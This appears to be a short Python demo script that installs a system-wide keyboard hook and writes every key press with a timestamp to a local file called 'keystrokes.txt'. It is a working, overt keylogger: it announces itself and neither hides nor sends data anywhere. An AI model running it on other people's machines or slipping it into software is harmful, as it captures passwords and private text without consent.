import keyboard
import datetime

log_file = 'keystrokes.txt'

def on_key_press(event):
    key = event.name
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file, 'a') as file:
        file.write(f'{timestamp} - {key}\n')

keyboard.on_press(on_key_press)

try:
    print("Logging keystrokes. Press Ctrl + C to stop.")
    keyboard.wait('ctrl+c')
except KeyboardInterrupt:
    print("\nLogging stopped.")
finally:
    keyboard.unhook_all()
